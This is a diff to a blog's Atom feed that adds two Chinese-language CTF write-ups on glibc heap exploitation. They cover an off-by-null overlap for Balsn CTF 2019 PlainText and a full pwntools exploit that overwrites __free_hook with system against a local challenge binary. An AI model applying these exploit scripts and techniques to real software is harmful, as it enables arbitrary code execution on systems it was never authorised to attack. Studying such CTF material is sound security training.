@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-01-11T15:34:55.469Z</updated>
+  <updated>2022-01-16T03:44:40.898Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,48 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>off_by_none_2.31</title>
+    <link href="http://example.com/2022/01/16/off_by_none_2.31/"/>
+    <id>http://example.com/2022/01/16/off_by_none_2.31/</id>
+    <published>2022-01-16T02:28:49.627Z</published>
+    <updated>2022-01-16T03:44:40.898Z</updated>
+    
+    <content type="html"><![CDATA[<p>在2.29的版本后加入了这样的防护</p><pre><code>  if (__glibc_unlikely (chunksize(p) != prevsize))    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</code></pre><p>/* consolidate backward */<br>    if (!prev_inuse(p)) {<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((long) prevsize));<br>      if (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (“corrupted size vs. prev_size while consolidating”);<br>      unlink_chunk (av, p);<br>    }</p><pre><code>// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</code></pre><p>也就是说上一chunk的size必须要与该chunk的prevsize一致并且还要通过unlink的检测。</p><p>所以fake_chunk必须可以控制其size,fd,bk使其 FD-&gt;bk == p ; BK-&gt;fd == p 。 之后通过溢出修改某一chunk(D)的prevsize和inuse位为\x00 ，此时free(D)与p 形成合并，p与其FD,BK进行unlink操作。即可形成overloap</p><p><img src="https://s2.loli.net/2022/01/16/nQgS4yhpcwZKD7e.png"></p><p>以Balsn_CTF_2019-PlainText举例：</p><pre><code>   for i in range(16):      add(0x10,&#39;fill&#39;)   for i in range(16):      add(0x60,&#39;fill&#39;)   for i in range(9):      add(0x70,&#39;fill&#39;)   for i in range(5):      add(0xC0,&#39;fill&#39;)   for i in range(2):      add(0xE0,&#39;fill&#39;)   add(0x170,&#39;fill&#39;)   add(0x190,&#39;fill&#39;)# 49   add(0xa9D0,&#39;addralign&#39;) # 50</code></pre><h2 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h2><p>如果bin里有堆，最好把他申请出来，然后申请到合适的chunk大小使得下一chunk的地址的后16位为\x00 (实际远程时无法控制低4位的大小，需要进行爆破，有1/16的概率)</p><p><img src="https://s2.loli.net/2022/01/16/H9JQZ64UxNY5DK1.png"></p><h2 id="2-布局"><a href="#2-布局" class="headerlink" title="2.布局"></a>2.布局</h2><pre><code>   add(0x28,p64(0) + p64(0x241) + b&#39;\x28&#39;) # 53 fd-&gt;bk : 0xA0 - 0x18   add(0x28,&#39;pass-loss control&#39;) # 54   add(0xF8,&#39;pass&#39;) # 55   add(0x28,&#39;pass&#39;) # 56   add(0x28,&#39;pass&#39;) # 57   add(0x28,&#39;pass&#39;) # 58   add(0x28,&#39;pass&#39;) # 59   add(0x28,&#39;pass-loss control&#39;) # 60   add(0x4F8,&#39;to be off-by-null&#39;) # 61  0250</code></pre><p>其中\x28是p-&gt;fd , 0x241是p(fake_chunk的size)之后也会以这个大小与 chunk61 来合并.</p><h2 id="3-修复fd"><a href="#3-修复fd" class="headerlink" title="3.修复fd"></a>3.修复fd</h2><p>此时BK-&gt;fd还没有修复好，为了在修复的同时不破坏掉size，需要把它放入fastbin.同时为了利用地址信息需要把 B , C , A 依次free掉</p><p><img src="https://s2.loli.net/2022/01/16/EUSDhnVw4gTo8KI.png"></p><p>所以，需要先将Tcache 填满 ， 然后依次 free chunk B C A ，清空Tcache ，申请回chunk(A)，复写fd,使其指向p (BK-fd构造完成)</p><p>然后由于 Tcache 的 stash 机制，chunk B C 进入 Tcache，再申请回来的就是 chunk B，部分覆写使 fd 指向 fake_chunk。(FD-&gt;bk构造完成)</p><pre><code>   for i in range(7):      add(0x28,&#39;tcache&#39;)   for i in range(7):      delete(61 + 1 + i)   delete(54)     #b  0040   delete(60)     #c  0230   delete(53)     #a  0000   #a-&gt;c-&gt;b   for i in range(7):      add(0x28,&#39;tcache&#39;)# 53,54,60,62,63,64,65   add(0x28,&#39;\x10&#39;) # 53-&gt;66  a## stashed ##   add(0x28,&#39;\x10&#39;) # 54-&gt;67  b   add(0x28,b&#39;a&#39; * 0x20 + p64(0x240)) # 60-&gt;68  c   0220   gdb.attach(io)   delete(61)  #d</code></pre><h2 id="4-泄露"><a href="#4-泄露" class="headerlink" title="4.泄露"></a>4.泄露</h2><p>delete(61)  #d 后形成了overloap</p><p>利用堆重叠进行泄露</p><pre><code>add(0x140,&#39;pass&#39;) # 61show(56)libc_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - libc.sym[&quot;__malloc_hook&quot;] - 0x10 - 0x60log.success(&quot;libc_base:&quot; + hex(libc_base))__free_hook_addr = libc_base + libc.sym[&quot;__free_hook&quot;]add(0x28,&#39;pass&#39;) # 69&lt;-56add(0x28,&#39;pass&#39;) # 70&lt;-57delete(70)delete(69)show(56)heap_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - 0x1A0log.success(&quot;heap_base:&quot; + hex(heap_base))</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;在2.29的版本后加入了这样的防护&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;  if (__glibc_unlikely (chunksize(p) != prevsize))
+    malloc_printerr (&amp;quot;corrupted size vs. prev_si</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>1.10长安抗疫赛</title>
+    <link href="http://example.com/2022/01/13/1.12%E7%94%B5%E4%BF%A1%E6%9D%AF/"/>
+    <id>http://example.com/2022/01/13/1.12%E7%94%B5%E4%BF%A1%E6%9D%AF/</id>
+    <published>2022-01-13T08:47:52.315Z</published>
+    <updated>2022-01-13T09:34:16.153Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="https://s2.loli.net/2022/01/13/HBngCYcTMOr8xF4.png"></p><p>因为用gets,可以看出这里存在溢出漏洞</p><p>可以通过溢出修改size,再free掉，形成overloap</p><pre><code>for i in range(10):   ad(&#39;/bin/sh\x00&#39;)rm(0)ad(b&#39;\x00&#39;*0x88+p64(0x90*8+1))    #tcache&lt;0x400  unsortbin&gt;0x400rm(1)ad(&#39;a&#39;)dp(2)leak = u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)base = leak-96-0x10-libc.sym[&#39;__malloc_hook&#39;]system = base + libc.sym[&#39;system&#39;]free = base + libc.sym[&#39;__free_hook&#39;]print(&quot;leak---&gt;&quot;+hex(leak))print(&quot;free---&gt;&quot;+hex(free))print(&quot;system-&gt;&quot;+hex(system))</code></pre><p>利用tcache，溢出修改fd从而打free_hook</p><pre><code>rm(6)rm(5)rm(4)ad(b&#39;\x00&#39;*0x88 + p64(0x91) + p64(free))#gdb.attach(io)ad(p64(system))ad(p64(system))rm(8)</code></pre><p>exp:<br>    #!/usr/bin/env python3<br>    #-<em>- coding:utf-8 -</em>-<br>    from pwn import *<br>    import os<br>    r   =  lambda x : io.recv(x)<br>    ra  =  lambda   : io.recvall()<br>    rl  =  lambda   : io.recvline(keepends = True)<br>    ru  =  lambda x : io.recvuntil(x, drop = True)<br>    s   =  lambda x : io.send(x)<br>    sl  =  lambda x : io.sendline(x)<br>    sa  =  lambda x, y : io.sendafter(x, y)<br>    sla =  lambda x, y : io.sendlineafter(x, y)<br>    ia  =  lambda : io.interactive()<br>    c   =  lambda : io.close()<br>    li    = lambda x : log.info(‘\x1b[01;38;5;214m’ + x + ‘\x1b[0m’)</p><pre><code>#------------------------------------------------io = process(&#39;./pwn1&#39;)context.log_level=&#39;debug&#39;elf = ELF(&#39;./pwn1&#39;)libc = ELF(&quot;./libc-2.31.so&quot;)#------------------------------------------------def ad(con):    sla(&quot;&gt;&gt; &quot;,&#39;1&#39;)    sla(&quot;content: &quot;,con)def rm(idx):    sla(&quot;&gt;&gt; &quot;,&#39;2&#39;)    sla(&quot;index: &quot;,str(idx))def md(sz, na):    sla(&#39;&gt;&gt; &#39;, &#39;4&#39;)    sla(&#39;size of it&#39;, str(sz))    sla(&#39;name&#39;, na)def dp(idx):    sla(&quot;&gt;&gt; &quot;,&#39;3&#39;)    sla(&#39;index: &#39;, str(idx))def finish():    ia()    c()def exploit():    li(&#39;exploit...&#39;)    for i in range(10):       ad(&#39;/bin/sh\x00&#39;)    rm(0)    ad(b&#39;\x00&#39;*0x88+p64(0x90*8+1))    #tcache&lt;0x400  unsortbin&gt;0x400    rm(1)    ad(&#39;a&#39;)    dp(2)    leak = u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)    base = leak-96-0x10-libc.sym[&#39;__malloc_hook&#39;]    system = base + libc.sym[&#39;system&#39;]    free = base + libc.sym[&#39;__free_hook&#39;]    print(&quot;leak---&gt;&quot;+hex(leak))    print(&quot;free---&gt;&quot;+hex(free))    print(&quot;system-&gt;&quot;+hex(system))    #gdb.attach(io)    rm(6)    rm(5)    rm(4)    ad(b&#39;\x00&#39;*0x88 + p64(0x91) + p64(free))    #gdb.attach(io)    ad(p64(system))    ad(p64(system))    rm(8)#-------------------------------startif __name__ == &#39;__main__&#39;:    exploit()    finish()</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/01/13/HBngCYcTMOr8xF4.png&quot;&gt;</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>1.10长安抗疫赛</title>
